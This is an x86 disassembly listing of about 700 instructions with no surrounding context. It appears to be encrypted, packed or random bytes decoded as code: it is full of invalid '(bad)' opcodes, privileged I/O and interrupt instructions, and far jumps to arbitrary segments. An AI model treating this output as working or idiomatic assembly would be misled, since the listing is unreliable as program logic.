  418d2a:	push   ecx
  418d2c:	xchg   BYTE PTR ds:0xc414d26,cl
  418d32:	pushf  
  418d33:	pop    ebp
  418d34:	sar    DWORD PTR [edi],0x32
  418d37:	mov    al,ds:0x39e6c833
  418d3c:	ficomp WORD PTR [ebx+0x45]
  418d3f:	adc    BYTE PTR [ecx-0x72a76992],dh
  418d45:	out    0xd9,eax
  418d47:	(bad)  
  418d48:	dec    edi
  418d49:	xchg   ecx,eax
  418d4a:	daa    
  418d4b:	call   0x7c98:0x2e177e32
  418d52:	adc    eax,ebx
  418d54:	and    eax,0xed9bee9c
  418d59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d5a:	push   es
  418d5b:	lds    edi,FWORD PTR [edx+ebp*4]
  418d5e:	and    esp,DWORD PTR [edi+0x68]
  418d61:	outs   dx,BYTE PTR ds:[esi]
  418d62:	jbe    0x418d9e
  418d64:	jno    0x418dd9
  418d66:	dec    esi
  418d67:	mov    edx,0x2b586c90
  418d6c:	das    
  418d6d:	int3   
  418d6e:	cmp    DWORD PTR [edx+0x0],esi
  418d71:	and    eax,0x907c5dc
  418d76:	sub    edx,esi
  418d78:	add    eax,0xf5c271f4
  418d7d:	or     eax,edi
  418d7f:	aam    0xd9
  418d81:	inc    DWORD PTR ds:0x98860919
  418d87:	cmp    BYTE PTR [esi-0x2f755573],dh
  418d8d:	aam    0xa7
  418d8f:	dec    edi
  418d90:	and    edx,DWORD PTR [edi]
  418d92:	pop    edx
  418d93:	jmp    0x418dbd
  418d95:	adc    al,0x9d
  418d97:	test   al,bh
  418d99:	jno    0x418e07
  418d9b:	ja     0x418df5
  418d9d:	bnd addr16 jge 0x418dca
  418da1:	retf   0xc58e
  418da4:	fld    TBYTE PTR [ebx-0x22]
  418da7:	jne    0x418d98
  418da9:	xor    esi,DWORD PTR [ebx+0x2876b029]
  418daf:	int    0xa3
  418db1:	add    al,0x99
  418db3:	sar    BYTE PTR ds:0xfdb924f,1
  418db9:	int3   
  418dba:	pop    edi
  418dbb:	pop    eax
  418dbc:	pushf  
  418dbd:	lds    ecx,FWORD PTR [edi+0x70]
  418dc0:	mov    eax,0x9ae1771d
  418dc5:	bound  esi,QWORD PTR [ecx-0x221961f2]
  418dcb:	js     0x418dc5
  418dcd:	out    dx,al
  418dce:	pop    esi
  418dcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dd0:	push   0x96694bb
  418dd5:	jbe    0x418e08
  418dd7:	or     BYTE PTR [esi+0x4057c7bc],0x2b
  418dde:	and    bl,BYTE PTR ds:0xc6d0f93f
  418de4:	icebp  
  418de5:	xchg   ecx,eax
  418de6:	jno    0x418dc7
  418de8:	pop    es
  418de9:	mov    edi,0x7b3768d5
  418dee:	cli    
  418def:	into   
  418df0:	mov    edi,0xdb92f91a
  418df5:	inc    edi
  418df6:	jnp    0x418d8a
  418df8:	pop    ds
  418df9:	mov    ecx,0x431cdec0
  418dfe:	jp     0x418e38
  418e00:	rcr    ah,0x19
  418e03:	mov    dh,0x89
  418e05:	out    0xcd,eax
  418e07:	mov    bl,0x1
  418e09:	xor    edi,DWORD PTR [ecx]
  418e0b:	add    BYTE PTR [ecx-0x61],dl
  418e0e:	leave  
  418e0f:	and    ebp,ebp
  418e11:	mov    DWORD PTR ds:0xbd5acf1f,0x4582c06d
  418e1b:	lods   al,BYTE PTR ds:[esi]
  418e1c:	aad    0xe6
  418e1e:	shl    DWORD PTR [ebx-0x4f60f580],cl
  418e24:	shl    BYTE PTR [ebp-0x15],1
  418e27:	adc    al,0xa5
  418e29:	inc    edi
  418e2a:	mov    dl,0x42
  418e2c:	sub    DWORD PTR [ebp-0x2e],edi
  418e2f:	mov    al,ds:0xaf43ce8e
  418e34:	jb     0x418e4b
  418e36:	in     eax,dx
  418e37:	dec    ecx
  418e38:	repz cmp eax,0xb348cf4
  418e3e:	lock and DWORD PTR [eax+0x5e40cc4],edi
  418e45:	sub    DWORD PTR [edi],ebx
  418e47:	inc    esp
  418e48:	cmp    al,0xbe
  418e4a:	(bad)  
  418e4b:	out    dx,al
  418e4c:	leave  
  418e4d:	sub    edi,DWORD PTR [ebp-0x7bf53bd0]
  418e53:	gs sti 
  418e55:	pop    edx
  418e56:	adc    DWORD PTR [ebp+0x55],ecx
  418e59:	xchg   ecx,eax
  418e5a:	rcl    BYTE PTR [edx],cl
  418e5c:	dec    BYTE PTR [edx+0x76e12de6]
  418e62:	sub    eax,0x64583f1d
  418e67:	jmp    0x691f:0x528edce9
  418e6e:	in     eax,dx
  418e6f:	(bad)  
  418e70:	jno    0x418e45
  418e72:	xchg   ebx,eax
  418e73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e74:	lock or BYTE PTR [ecx-0x23],al
  418e78:	fs jns 0x418e2e
  418e7b:	sub    DWORD PTR [eax],ebx
  418e7d:	fldcw  WORD PTR [ecx-0x636ba82c]
  418e83:	cmp    al,0xb8
  418e85:	add    eax,0x6101c6a7
  418e8a:	enter  0x9e05,0x5a
  418e8e:	mov    ?,WORD PTR [ebx-0x3fccd36e]
  418e94:	jne    0x418f00
  418e96:	fucom  st(5)
  418e98:	inc    ecx
  418e99:	pusha  
  418e9a:	out    0x42,al
  418e9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e9d:	retf   
  418e9e:	inc    ebx
  418e9f:	pop    ss
  418ea0:	in     al,0xdb
  418ea2:	cmp    al,0x66
  418ea4:	pop    ds
  418ea5:	mov    ch,0x76
  418ea7:	push   cs
  418ea8:	push   edx
  418ea9:	pop    eax
  418eaa:	int    0xd0
  418eac:	ror    BYTE PTR ds:0x7cbc93c2,0xfa
  418eb3:	xchg   BYTE PTR ds:0xf701a432,al
  418eb9:	iret   
  418eba:	nop
  418ebb:	mov    ds:0x90ce25f5,eax
  418ec0:	xor    DWORD PTR [eax],ecx
  418ec2:	mov    cl,0x5b
  418ec4:	out    dx,al
  418ec5:	xchg   ebx,eax
  418ec6:	and    edx,DWORD PTR [edi+edx*4]
  418ec9:	imul   edi,DWORD PTR [ebp+0x636c297d],0x1b3b5124
  418ed3:	loope  0x418ed3
  418ed5:	int    0x18
  418ed7:	add    al,0x89
  418ed9:	aas    
  418eda:	pop    eax
  418edb:	xchg   esp,eax
  418edc:	dec    ebp
  418edd:	mov    ah,0x17
  418edf:	push   eax
  418ee0:	into   
  418ee1:	scas   al,BYTE PTR es:[edi]
  418ee2:	inc    edx
  418ee3:	sbb    BYTE PTR ds:0x85ed78a4,dh
  418ee9:	push   ebp
  418eea:	(bad)  
  418eeb:	inc    ecx
  418eec:	jno    0x418e8d
  418eee:	bound  ebp,QWORD PTR [ecx]
  418ef0:	sbb    ecx,edx
  418ef2:	cdq    
  418ef3:	sbb    BYTE PTR [eax],ch
  418ef5:	sbb    ecx,edx
  418ef7:	fsubr  DWORD PTR [esi+0x3894e6bf]
  418efd:	jge    0x418e9c
  418eff:	xor    al,0xcf
  418f01:	in     eax,dx
  418f02:	xchg   ebx,eax
  418f03:	fstp   QWORD PTR [edx]
  418f05:	mov    edx,0xe6d33caf
  418f0a:	cmc    
  418f0b:	sbb    eax,0x42210941
  418f10:	pmulhuw mm3,mm3
  418f13:	addr16 ja 0x418f34
  418f16:	add    bl,bh
  418f18:	out    0x8e,al
  418f1a:	lahf   
  418f1b:	hlt    
  418f1c:	aam    0xd
  418f1e:	add    DWORD PTR [edi-0x6a],ecx
  418f21:	mov    eax,ds:0x596073e4
  418f26:	dec    edi
  418f27:	leave  
  418f28:	fadd   QWORD PTR [edx-0x473985d0]
  418f2e:	mov    esi,0xa8390d40
  418f33:	cs push 0x59098dfa
  418f39:	stos   DWORD PTR es:[edi],eax
  418f3a:	movhps xmm7,QWORD PTR [ebx]
  418f3d:	sub    dl,BYTE PTR [esi+0x426450f1]
  418f43:	jns    0x418fa3
  418f45:	call   0x682c4c9a
  418f4a:	loopne 0x418f9b
  418f4c:	mov    ebp,DWORD PTR [ecx]
  418f4e:	push   ds
  418f4f:	loopne 0x418ee7
  418f51:	sbb    eax,0x8cf626e3
  418f56:	and    BYTE PTR ds:[edi-0x6da9f16f],cl
  418f5d:	or     al,0xbc
  418f5f:	mov    DWORD PTR [eax],ecx
  418f61:	add    cl,BYTE PTR [edi-0x226e8170]
  418f67:	sbb    bh,al
  418f69:	imul   DWORD PTR [ebp-0x23]
  418f6c:	mov    ecx,0xa08855ff
  418f71:	cmp    DWORD PTR [edi+0x1d417274],ebx
  418f77:	mov    ds:0xd44ae868,eax
  418f7c:	ja     0x418f8a
  418f7e:	into   
  418f7f:	xor    BYTE PTR [esi+0x24],0x7c
  418f83:	adc    al,0xd1
  418f85:	icebp  
  418f86:	int3   
  418f87:	xor    edi,DWORD PTR [edx]
  418f89:	push   ecx
  418f8a:	cli    
  418f8b:	mov    eax,0x286d7164
  418f90:	mov    edx,0x40ad35f3
  418f95:	rcl    ebx,0x6b
  418f98:	mov    bh,0xe9
  418f9a:	stos   BYTE PTR es:[edi],al
  418f9b:	lea    edx,[ebx]
  418f9d:	xor    al,0x8
  418f9f:	push   gs
  418fa1:	call   0x7440:0x531e1187
  418fa8:	mov    ds:0x78eb4155,al
  418fad:	push   esp
  418fae:	dec    esi
  418faf:	add    BYTE PTR [edi+esi*2-0x18],dh
  418fb3:	imul   esi,edx,0xbb73478e
  418fb9:	pop    ebp
  418fba:	sbb    DWORD PTR [esi+0x28],esi
  418fbd:	(bad)  [esi-0x8309679]
  418fc3:	push   ebp
  418fc4:	ror    DWORD PTR [ebp-0x53c0b4c6],cl
  418fca:	sub    ecx,DWORD PTR [ebx-0x2f]
  418fcd:	scas   al,BYTE PTR es:[edi]
  418fce:	cmp    ch,BYTE PTR [edx]
  418fd0:	mov    eax,0x686ee381
  418fd5:	xchg   esp,esi
  418fd7:	das    
  418fd8:	pop    ebp
  418fd9:	xchg   ebp,eax
  418fda:	test   DWORD PTR [ebx+0x2c7566be],esi
  418fe0:	and    esp,esi
  418fe2:	add    bl,BYTE PTR [ecx+eax*4-0x1aa390f0]
  418fe9:	mov    ebx,0x4c593f93
  418fee:	inc    esp
  418fef:	ret    
  418ff0:	jae    0x419009
  418ff2:	test   ebp,0xf3c57b53
  418ff8:	loope  0x41902d
  418ffa:	fsubr  QWORD PTR [ebx-0x16742e39]
  419000:	enter  0x9bf9,0x7f
  419004:	adc    BYTE PTR [eax],bh
  419006:	fwait
  419007:	call   0x151e0d5
  41900c:	mov    DWORD PTR [ebp+0x66d40e93],ebx
  419012:	pop    ebp
  419013:	call   0x526f9710
  419018:	sub    al,0x14
  41901a:	mov    eax,0x61f26188
  41901f:	shr    DWORD PTR [esp+ebx*8],0xf7
  419023:	cmp    edi,DWORD PTR [edx+ebp*1-0x7a1517d4]
  41902a:	adc    eax,eax
  41902c:	jge    0x419030
  41902e:	add    eax,0x60135ade
  419033:	loop   0x41902a
  419035:	aad    0xaf
  419037:	mov    ebx,DWORD PTR [ebp-0x3b]
  41903a:	aaa    
  41903b:	in     eax,dx
  41903c:	ss and eax,0xfff767cd
  419042:	jle    0x418fec
  419044:	cmc    
  419045:	stos   BYTE PTR es:[edi],al
  419046:	push   ss
  419047:	cwde   
  419048:	mov    dh,0x45
  41904a:	sar    BYTE PTR [edx],cl
  41904c:	call   0xa9fdc17a
  419051:	cmp    dh,bl
  419053:	stos   DWORD PTR es:[edi],eax
  419054:	ds jle 0x419050
  419057:	sub    eax,0xdf6014c
  41905c:	call   0x14021047
  419061:	gs ja  0x41900e
  419064:	push   eax
  419065:	sbb    eax,0x1d59147a
  41906a:	cld    
  41906b:	int    0xac
  41906d:	js     0x419072
  41906f:	int3   
  419070:	pusha  
  419071:	not    DWORD PTR [edx+eiz*2+0x401d1583]
  419078:	jmp    0x9465:0x66acdfac
  41907f:	xchg   edi,ebp
  419081:	je     0x419026
  419083:	lods   eax,DWORD PTR ds:[esi]
  419084:	dec    esp
  419085:	and    eax,0x3f2841f2
  41908a:	sub    BYTE PTR [edx-0x71],al
  41908d:	cmp    BYTE PTR [eax-0x4e],al
  419090:	pop    DWORD PTR [ebx+0x52]
  419093:	xchg   esi,eax
  419094:	push   0x59
  419096:	addr16 pop esi
  419098:	in     al,dx
  419099:	mov    BYTE PTR [ecx],dl
  41909b:	xchg   esi,eax
  41909c:	stos   DWORD PTR es:[edi],eax
  41909d:	js     0x419085
  41909f:	out    0xa4,al
  4190a1:	push   esp
  4190a2:	inc    eax
  4190a3:	lds    edi,FWORD PTR ds:0xb33614e5
  4190a9:	clc    
  4190aa:	sub    al,0xb7
  4190ac:	add    al,0x18
  4190ae:	pop    esp
  4190af:	pop    eax
  4190b0:	scas   eax,DWORD PTR es:[edi]
  4190b1:	ss jge 0x419107
  4190b4:	mul    esp
  4190b6:	(bad)  
  4190b7:	sub    eax,0x39ee5009
  4190bc:	sbb    dl,BYTE PTR [edi+0x61522651]
  4190c2:	push   0xec836216
  4190c7:	and    al,0xfb
  4190c9:	retf   
  4190ca:	dec    edx
  4190cb:	mov    edx,0xac4dd7f3
  4190d0:	xchg   esp,eax
  4190d1:	mov    ecx,0x1a2aa704
  4190d6:	pop    esp
  4190d7:	add    esp,edx
  4190d9:	xor    ecx,DWORD PTR [edx+0x2a]
  4190dc:	in     al,0x18
  4190de:	lods   al,BYTE PTR ds:[esi]
  4190df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190e0:	fistp  QWORD PTR [ebp-0x202d2501]
  4190e6:	add    edi,DWORD PTR [edx-0x795453ff]
  4190ec:	(bad)  
  4190ed:	jmp    0xc08f:0x9d148132
  4190f4:	(bad)  [eax]
  4190f6:	mov    ebp,0x72f8e945
  4190fb:	daa    
  4190fc:	daa    
  4190fd:	inc    ch
  4190ff:	add    eax,DWORD PTR [edi]
  419101:	and    DWORD PTR ds:[ecx+eiz*1+0x31],edx
  419106:	mov    bh,0xaa
  419108:	push   ebp
  419109:	ds call 0x7fbf058a
  41910f:	das    
  419110:	sar    BYTE PTR [ebx+eiz*1],0x9f
  419114:	in     al,0x79
  419116:	dec    edi
  419117:	push   esp
  419118:	and    dl,BYTE PTR [edi]
  41911a:	fucom  st(7)
  41911c:	and    edx,ebx
  41911e:	pop    esp
  41911f:	into   
  419120:	dec    BYTE PTR [edi+0x8]
  419123:	imul   edx,DWORD PTR [edi+0x3a269a75],0x2a
  41912a:	xchg   ecx,eax
  41912b:	js     0x419167
  41912d:	fnstsw WORD PTR [ebp-0x9355408]
  419133:	jge    0x419143
  419135:	jmp    0x4190f1
  419137:	adc    al,0x3b
  419139:	xchg   ebx,eax
  41913a:	sub    eax,0xadb1fbc5
  41913f:	jmp    0xdac3:0xfbf1fcdc
  419146:	in     eax,0x5a
  419148:	xor    ebx,esi
  41914a:	scas   al,BYTE PTR es:[edi]
  41914b:	sub    DWORD PTR [ebx-0x49230d20],edi
  419151:	jno    0x4190e5
  419153:	push   eax
  419154:	jmp    0x41915d
  419156:	jmp    0x4190e3
  419158:	sbb    ebp,DWORD PTR [ebp-0x67d4abef]
  41915e:	fimul  DWORD PTR [ecx]
  419160:	xor    ecx,DWORD PTR [edx]
  419162:	dec    ecx
  419163:	jns    0x41911f
  419165:	pop    esi
  419166:	xchg   ebx,eax
  419167:	xor    al,0x4c
  419169:	inc    eax
  41916a:	mov    eax,ds:0xf81b1426
  41916f:	icebp  
  419170:	xor    eax,0xcd737719
  419175:	shl    DWORD PTR [edx-0x7e],1
  419178:	fwait
  419179:	and    al,0x51
  41917b:	rol    DWORD PTR [edi+edi*1+0xf],0xe4
  419180:	iret   
  419181:	push   es
  419182:	pop    ebp
  419183:	in     al,0xd
  419185:	mov    BYTE PTR [eax],ch
  419187:	sar    BYTE PTR [edx+0x76],0x64
  41918b:	imul   ebx,ebp,0x9c55882a
  419191:	into   
  419192:	(bad)  
  419194:	fst    DWORD PTR [edx]
  419196:	jle    0x4191de
  419198:	repnz loop 0x419210
  41919b:	in     al,0x83
  41919d:	push   ebx
  41919e:	cld    
  41919f:	push   ecx
  4191a0:	xor    bh,BYTE PTR [ecx+eiz*1]
  4191a3:	push   ebp
  4191a4:	nop
  4191a5:	(bad)  
  4191a7:	cli    
  4191a8:	push   esi
  4191a9:	call   0xec1467a4
  4191ae:	pop    es
  4191af:	adc    ah,BYTE PTR [ebp-0x67ff1e61]
  4191b5:	iret   
  4191b6:	sbb    bl,ch
  4191b8:	sbb    BYTE PTR [ecx+0x68c0e2ad],dl
  4191be:	retf   
  4191bf:	lods   eax,DWORD PTR ds:[esi]
  4191c0:	adc    BYTE PTR [edi-0x28a25785],al
  4191c6:	scas   eax,DWORD PTR es:[edi]
  4191c7:	add    ah,bh
  4191c9:	sbb    BYTE PTR [eax+0x3e5ec590],al
  4191cf:	mov    dh,0x5a
  4191d1:	int3   
  4191d2:	jmp    0x2e3127ad
  4191d7:	mov    ebx,0x4e9e5b11
  4191dc:	pop    ebx
  4191dd:	mov    bh,0xf
  4191df:	push   0xf751c08f
  4191e4:	push   cs
  4191e5:	(bad)  
  4191e6:	sbb    al,0x3a
  4191e8:	and    ebp,DWORD PTR [edx+0x14]
  4191eb:	popa   
  4191ec:	das    
  4191ed:	data16 fdiv st,st(0)
  4191f0:	or     edx,DWORD PTR [edx]
  4191f2:	sub    al,0x4d
  4191f4:	mov    cl,0x3e
  4191f6:	sahf   
  4191f7:	xchg   DWORD PTR [edi],ebx
  4191f9:	leave  
  4191fa:	jle    0x41918b
  4191fc:	data16 in al,dx
  4191fe:	mov    edx,0xaa91bbb4
  419203:	int3   
  419204:	sbb    eax,0x21612469
  419209:	inc    ecx
  41920a:	xor    al,0xdc
  41920c:	jge    0x4191b7
  41920e:	adc    bl,BYTE PTR [ebx]
  419210:	scas   al,BYTE PTR es:[edi]
  419211:	mov    BYTE PTR [edi+eax*2+0xd077da6],bh
  419218:	or     eax,DWORD PTR [eax-0x1f0f4b7c]
  41921e:	(bad)  
  41921f:	mov    ebx,0xeadcefbe
  419224:	or     edi,ebx
  419226:	xor    eax,0x4d34cd01
  41922b:	into   
  41922c:	pushf  
  41922d:	mov    eax,0x81b119fb
  419232:	loopne 0x41928f
  419234:	ins    DWORD PTR es:[edi],dx
  419235:	imul   edi,edx,0x43191612
  41923b:	push   edx
  41923c:	fld    QWORD PTR [esp+ebp*1+0x3c15010c]
  419243:	cli    
  419244:	cld    
  419245:	mov    ebp,0xec3aca99
  41924a:	xchg   edi,eax
  41924b:	xchg   edi,eax
  41924c:	cmp    eax,0x9bd97e11
  419251:	div    BYTE PTR [ebx-0x738b4d1f]
  419257:	inc    eax
  419258:	inc    ebx
  419259:	cs or  eax,0x50981c96
  41925f:	arpl   WORD PTR [eax-0x22d9f145],di
  419265:	in     al,dx
  419266:	mov    esi,0xa08e1caa
  41926b:	xor    BYTE PTR [esi+ecx*2],0xbd
  41926f:	fnstcw WORD PTR [esi]
  419271:	mov    bl,ah
  419273:	jl     0x4192df
  419275:	aaa    
  419276:	outs   dx,BYTE PTR ds:[esi]
  419277:	out    dx,al
  419278:	pop    esi
  419279:	in     eax,0x80
  41927b:	jmp    0xa7f:0x661df689
  419282:	jne    0x419209
  419284:	cmp    al,0x53
  419286:	je     0x41926f
  419288:	or     DWORD PTR [ecx-0x15],0xffffff80
  41928c:	bound  ecx,QWORD PTR [edi-0x6b]
  41928f:	aam    0xe0
  419291:	or     cl,BYTE PTR [edx-0x6787828a]
  419297:	jl     0x419311
  419299:	sbb    BYTE PTR [ebp+ecx*2-0x70],bl
  41929d:	jge    0xcb9d52df
  4192a3:	test   eax,0xe0632a77
  4192a8:	jl     0x41931c
  4192aa:	jp     0x4192de
  4192ac:	sub    eax,0x9adb7e08
  4192b1:	add    cl,BYTE PTR ds:0xe77884c3
  4192b7:	push   ecx
  4192b8:	jb     0x419320
  4192ba:	retf   
  4192bb:	stc    
  4192bc:	jge    0x4192fe
  4192be:	xchg   ebx,eax
  4192bf:	fisubr WORD PTR [eax-0x6b49227a]
  4192c5:	ror    BYTE PTR [edi],0x83
  4192c8:	sahf   
  4192c9:	(bad)  
  4192ca:	out    dx,eax
  4192cb:	mov    ah,0xbb
  4192cd:	outs   dx,BYTE PTR ds:[esi]
  4192ce:	addr16 sbb bh,cl
  4192d1:	lahf   
  4192d2:	push   eax
  4192d3:	test   eax,0xe050bea2
  4192d8:	pop    edi
  4192d9:	inc    ebp
  4192da:	aad    0x40
  4192dc:	push   0x8f50e10
  4192e1:	repnz mov ebp,edi
  4192e4:	lock sub al,ch
  4192e7:	xor    al,0xce
  4192e9:	inc    DWORD PTR [esi-0x80]
  4192ec:	stc    
  4192ed:	and    esp,DWORD PTR [edi+0x63cafda5]
  4192f3:	push   cs
  4192f4:	mov    esp,0xc371b8a9
  4192f9:	lea    ebp,[ecx-0x7a]
  4192fc:	lods   eax,DWORD PTR ds:[esi]
  4192fd:	and    BYTE PTR [esi-0x69d9b05a],0x71
  419304:	inc    edi
  419305:	enter  0x5f8f,0x6d
  419309:	cwde   
  41930a:	(bad)  
  41930b:	mov    ds:0xa72cfe46,al
  419310:	jg     0x419293
  419312:	mov    al,0x2b
  419314:	cs lahf 
  419316:	dec    esp
  419317:	jp     0x419364
  419319:	outs   dx,DWORD PTR ds:[esi]
  41931a:	or     BYTE PTR [edi+0x38],0xa3
  41931e:	sub    eax,DWORD PTR [edi+0x38b7bd48]
  419324:	inc    edx
  419325:	aas    
  419326:	in     eax,dx
  419327:	or     DWORD PTR [ebp-0x3a],edi
  41932a:	push   ebp
  41932b:	adc    esp,esi
  41932d:	mov    ch,0x23
  41932f:	or     BYTE PTR [edi],bl
  419331:	test   al,0x3d
  419333:	loopne 0x41939f
  419335:	sub    eax,0x9be5fb3f
  41933a:	pop    ecx
  41933b:	mov    bl,0x42
  41933d:	int3   
  41933e:	imul   esi,DWORD PTR [ebx],0x12
  419341:	sub    BYTE PTR [ebx-0x25],al
  419344:	dec    edi
  419345:	xchg   DWORD PTR [ebp+0x283ecc7d],ecx
  41934b:	sub    esp,DWORD PTR [ebx+0x41]
  41934e:	mov    cl,0xa
  419350:	push   ebx
  419351:	mov    ch,0xe2
  419353:	mov    edi,0x8298a62b
  419358:	mov    bl,0x8b
  41935a:	sti    
  41935b:	jbe    0x4192fc
  41935d:	stos   DWORD PTR es:[edi],eax
  41935e:	mov    ds:0x569e5e95,al
  419363:	cmp    al,0x92
  419365:	push   edx
  419366:	(bad)  
  419367:	or     al,0x95
  419369:	sahf   
  41936a:	dec    eax
  41936b:	icebp  
  41936c:	fimul  DWORD PTR [esi+ebp*2+0x4f0940eb]
  419373:	mov    edx,0x11449fc3
  419378:	fst    st(7)
  41937a:	ja     0x4193a7
  41937c:	jle    0x4193dd
  41937e:	nop
  41937f:	xchg   esp,eax
  419380:	add    BYTE PTR [ecx+0xa],0xb2
  419384:	loop   0x41935c
  419386:	in     eax,dx
  419387:	sbb    eax,0xc67515d1
  41938c:	ja     0x4193bd
  41938e:	ror    bh,cl
  419390:	pushf  
  419391:	mov    ebx,0x1cc354d
  419396:	ffreep st(7)
  419398:	jl     0x4193a8
  41939a:	test   al,0xca
  41939c:	mov    ecx,0x682b14d4
  4193a1:	es push edi
  4193a3:	push   edi
  4193a4:	pop    edx
  4193a5:	push   eax
  4193a6:	pop    ebx
  4193a7:	sbb    bh,BYTE PTR [ebx]
  4193a9:	rcl    DWORD PTR [ebx],cl
  4193ab:	and    DWORD PTR [edi+ecx*4+0x763301e5],esp
  4193b2:	dec    edx
  4193b3:	popf   
  4193b4:	test   DWORD PTR [ebx+edx*2],edx
  4193b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193b8:	out    dx,eax
  4193b9:	xor    al,0x7c
  4193bb:	sbb    DWORD PTR [edx-0x5],ebp
  4193be:	jmp    0xcea0:0x2bb16da2
  4193c5:	fidivr WORD PTR [ecx+0x11]
  4193c8:	mov    BYTE PTR [ebx],al
  4193ca:	xor    BYTE PTR [esi],al
  4193cc:	xchg   dh,dl
  4193ce:	je     0x419384
  4193d0:	cld    
  4193d1:	ins    BYTE PTR es:[edi],dx
  4193d2:	mov    esp,0x64bbcf06
  4193d7:	mov    ah,al
  4193d9:	outs   dx,BYTE PTR ds:[esi]
  4193da:	shr    bl,0xd8
  4193dd:	xchg   esp,eax
  4193de:	call   0x7e01:0xb71249f2
  4193e5:	sub    esp,esp
  4193e7:	mov    al,0x8e
  4193e9:	aam    0x68
  4193eb:	inc    edi
  4193ec:	pop    ds
  4193ed:	xlat   BYTE PTR ds:[ebx]
  4193ee:	(bad)  
  4193ef:	cmp    esp,DWORD PTR [edi+edi*4]
  4193f2:	(bad)  
  4193f3:	fsubr  st(0),st
  4193f5:	xor    ch,BYTE PTR [eax]
  4193f7:	jo     0x419459
  4193f9:	push   ecx
  4193fa:	loope  0x41943c
  4193fc:	cld    
  4193fd:	out    dx,eax
  4193fe:	ret    
  4193ff:	and    ebp,DWORD PTR [edi-0x6e]
  419402:	push   eax
  419403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419404:	mov    bl,0x4b
  419406:	lock and cl,BYTE PTR [eax]
  419409:	icebp  
  41940a:	mov    eax,ds:0xcacaf98e
  41940f:	jle    0x419465
  419411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419412:	pop    ebp
  419413:	sbb    eax,0xa88d4d49
  419418:	nop
  419419:	xor    BYTE PTR [eax+0x13ad387b],0xbf
  419420:	jbe    0x41943a
  419422:	push   ecx
  419423:	pushf  
  419424:	xchg   ebp,eax
  419425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419426:	and    DWORD PTR [ebx-0x6a124892],edx
  41942c:	lock stos DWORD PTR es:[edi],eax
  41942e:	repnz mov fs,WORD PTR [esi+eax*8-0x2ff352f1]
  419436:	add    BYTE PTR [edx-0x15460684],0xa9
  41943d:	xor    al,0x1b
  41943f:	dec    esi
  419440:	out    dx,al
  419441:	lahf   
  419442:	push   edi
  419443:	bound  esp,QWORD PTR [edx+0x62]
  419446:	add    BYTE PTR [eax],dh
  419448:	mov    bl,0x9e
  41944a:	jo     0x419452
  41944c:	jecxz  0x4193d2
  41944e:	shr    DWORD PTR [esi+0x5a],cl
  419451:	dec    edi
  419452:	div    BYTE PTR [ebx+0x6526cacb]
  419458:	cwde   
  419459:	push   ss
  41945a:	shr    BYTE PTR [ecx-0x7e],cl
  41945d:	(bad)  
  41945e:	jbe    0x4194c2
  419460:	jnp    0x4193ef
  419462:	mov    edx,0x7b328577
  419467:	sti    
  419468:	jno    0x41948f
  41946a:	push   esi
  41946b:	mov    edx,0xcc93b07f
  419470:	int    0x34
  419472:	sbb    BYTE PTR [esi-0x4e],cl
  419475:	cwde   
  419476:	jns    0x419494
  419478:	mov    edi,0x151b56e8
  41947d:	lahf   
  41947e:	je     0x419419
  419480:	or     bh,BYTE PTR [edi-0x2b762ecc]
  419486:	aad    0x26
  419488:	mov    dh,0x97
  41948a:	or     al,bl
  41948c:	cmp    DWORD PTR [ebp+0x2c0b4610],esp
  419492:	sti    
  419493:	xor    dl,BYTE PTR [edx]
  419495:	xor    esp,ecx
  419497:	inc    edx
  419498:	or     eax,0x774bd2d9
  41949e:	rcl    BYTE PTR [esp+eiz*8],0x1e
  4194a2:	aad    0xee
  4194a4:	popa   
  4194a5:	jno    0x419471
  4194a7:	sbb    DWORD PTR [edx+ecx*8+0x1c3aa2e7],0xbf03a4b4
  4194b2:	in     al,0xc
  4194b4:	das    
  4194b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194b6:	jmp    0x6b3f:0xdffebdb
  4194bd:	inc    edi
  4194be:	xchg   edx,eax
  4194bf:	inc    esi
  4194c0:	das    
  4194c1:	ins    BYTE PTR es:[edi],dx
  4194c2:	pop    ebx
  4194c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194c4:	xor    esp,DWORD PTR [ecx]
  4194c6:	js     0x41948a
  4194c8:	mov    ah,0x3c
  4194ca:	repnz xor BYTE PTR [eax],dl
  4194cd:	jne    0x419538
  4194cf:	cmp    BYTE PTR [eax-0x518209eb],0x8f
  4194d6:	ins    BYTE PTR es:[edi],dx
  4194d7:	shr    BYTE PTR [esi],1
  4194d9:	mov    ds,esp
  4194db:	dec    ebx
  4194dc:	leave  
  4194dd:	test   BYTE PTR [edi],al
  4194df:	out    dx,eax
  4194e0:	mov    ds:0xa9869c,al
  4194e5:	mov    eax,0x69b2f8e
  4194ea:	retf   
  4194eb:	lods   al,BYTE PTR ds:[esi]
  4194ec:	mov    eax,ds:0x518187d4
  4194f1:	dec    esp
  4194f2:	(bad)  
  4194f3:	mov    DWORD PTR [edx-0x50],ebx
  4194f6:	push   es
  4194f7:	inc    eax
  4194f8:	push   ds
  4194f9:	xchg   ecx,eax
  4194fa:	shl    BYTE PTR [edx+eax*8-0x6e6d1aae],cl
  419501:	xchg   edx,eax
  419502:	dec    edx
  419503:	mov    cl,BYTE PTR [edx+0x12f43fbd]
  419509:	jbe    0x419498
  41950b:	xchg   ebx,eax
  41950c:	shr    DWORD PTR [ecx-0x61],1
  41950f:	lods   al,BYTE PTR ds:[esi]
  419510:	jl     0x419493
  419512:	push   ecx
  419513:	cmp    ebp,DWORD PTR [ecx-0x7c]
  419516:	push   ebx
  419517:	xor    al,0xa0
  419519:	imul   edx,DWORD PTR [edx],0x45f4004c
  41951f:	in     eax,dx
  419520:	adc    BYTE PTR [edx+0x52a2bb35],ah
  419526:	in     eax,0x82
  419528:	sub    ecx,DWORD PTR [ebp+0x5b1642ee]
  41952e:	leave  
  41952f:	pusha  
  419530:	stos   DWORD PTR es:[edi],eax
  419531:	imul   edi,DWORD PTR [esi-0xe],0xffffffdd
  419535:	js     0x4194f2
